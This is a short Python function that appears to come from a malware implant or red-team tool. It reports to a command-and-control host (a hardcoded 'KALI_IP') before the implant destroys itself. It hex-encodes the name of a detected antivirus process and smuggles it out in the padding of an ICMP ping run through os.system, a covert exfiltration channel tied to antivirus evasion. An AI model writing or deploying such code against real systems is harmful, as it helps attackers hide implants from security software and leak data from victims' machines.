
def send_gasp(reason):
    """
    Sends a final telemetry packet before self-destruction.
    Encodes the 'reason' (A/V process name) into the ICMP payload.
    """
    KALI_IP = "172.16.42.42"
    # Convert reason to hex for the ping padding (-p)
    reason_hex = reason.encode().hex()
    print(f"[*] GASPING: Reporting {reason} to C2...")
    os.system(f"ping -c 1 -p {reason_hex} {KALI_IP}")
